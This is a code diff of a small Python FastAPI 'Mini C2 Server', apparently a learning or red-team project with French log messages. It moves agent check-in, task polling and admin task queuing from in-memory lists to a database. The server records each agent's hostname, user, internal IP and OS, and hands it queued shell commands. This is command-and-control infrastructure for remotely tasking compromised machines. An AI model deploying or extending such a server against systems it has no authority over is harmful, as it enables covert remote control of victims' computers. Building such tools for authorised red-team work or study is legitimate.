@@ -1,4 +1,9 @@
-from fastapi import FastAPI
+from contextlib import asynccontextmanager
+from typing import AsyncGenerator
+
+from fastapi import FastAPI, Depends, HTTPException
+from sqlalchemy.ext.asyncio import AsyncSession
+
 from api.schemas import (
     AgentCheckIn, 
     TaskRequest, 
@@ -6,48 +11,78 @@ from api.schemas import (
     TaskResponse, 
     AdminTaskResponse
 )
+from core.database import get_db, init_db
+from core.crud import (
+    create_or_update_agent,
+    get_pending_task,
+    create_task,
+    get_task_queue_position,
+)
 
-app = FastAPI(title="Mini C2 Server")
 
-# --- MÉMOIRE ---
-registered_agents: list[AgentCheckIn] = []
-pending_tasks: dict[str, list[str]] = {}
+@asynccontextmanager
+async def lifespan(app: FastAPI) -> AsyncGenerator[None, None]:
+    """Lifecycle: crée les tables au démarrage."""
+    await init_db()
+    print("✅ Database initialized")
+    yield
+
+
+app = FastAPI(title="Mini C2 Server", lifespan=lifespan)
+
 
 # --- ROUTES ---
 
 # 1. Check-in
 @app.post("/api/v1/checkin", response_model=CheckInResponse)
-async def agent_checkin(data: AgentCheckIn) -> CheckInResponse:
+async def agent_checkin(
+    data: AgentCheckIn,
+    db: AsyncSession = Depends(get_db),
+) -> CheckInResponse:
     print(f"🔔 CHECK-IN: {data.hostname} ({data.agent_id})")
     
-    registered_agents.append(data)
-    
-    if data.agent_id not in pending_tasks:
-        pending_tasks[data.agent_id] = []
+    await create_or_update_agent(
+        db=db,
+        agent_id=data.agent_id,
+        username=data.username,
+        hostname=data.hostname,
+        internal_ip=data.internal_ip,
+        os_version=data.os_version,
+    )
 
     return CheckInResponse(status="registered", message="Bienvenue")
 
+
 # 2. Polling
 @app.get("/api/v1/tasks/{agent_id}", response_model=TaskResponse)
-async def get_tasks(agent_id: str) -> TaskResponse:
+async def get_tasks(
+    agent_id: str,
+    db: AsyncSession = Depends(get_db),
+) -> TaskResponse:
     
-    if agent_id in pending_tasks and len(pending_tasks[agent_id]) > 0:
-        task = pending_tasks[agent_id].pop(0)
-        print(f"📤 ENVOI: '{task}' -> {agent_id}")
-        return TaskResponse(command=task)
+    task = await get_pending_task(db, agent_id)
+    
+    if task:
+        print(f"📤 ENVOI: '{task.command}' -> {agent_id}")
+        return TaskResponse(command=task.command)
 
     return TaskResponse(command=None)
 
+
 # 3. Admin
 @app.post("/api/v1/admin/tasks", response_model=AdminTaskResponse)
-async def add_task(task: TaskRequest) -> AdminTaskResponse:
+async def add_task(
+    task: TaskRequest,
+    db: AsyncSession = Depends(get_db),
+) -> AdminTaskResponse:
     
-    if task.agent_id not in pending_tasks:
-        pending_tasks[task.agent_id] = []
+    try:
+        await create_task(db=db, agent_id=task.agent_id, command=task.command)
+    except ValueError as e:
+        raise HTTPException(status_code=404, detail=str(e))
     
-    pending_tasks[task.agent_id].append(task.command)
-    position_in_queue = len(pending_tasks[task.agent_id])
+    position = await get_task_queue_position(db, task.agent_id) + 1
     
     print(f"✅ TÂCHE AJOUTÉE: '{task.command}'")
 
-    return AdminTaskResponse(status="queued", position=position_in_queue)
+    return AdminTaskResponse(status="queued", position=position)
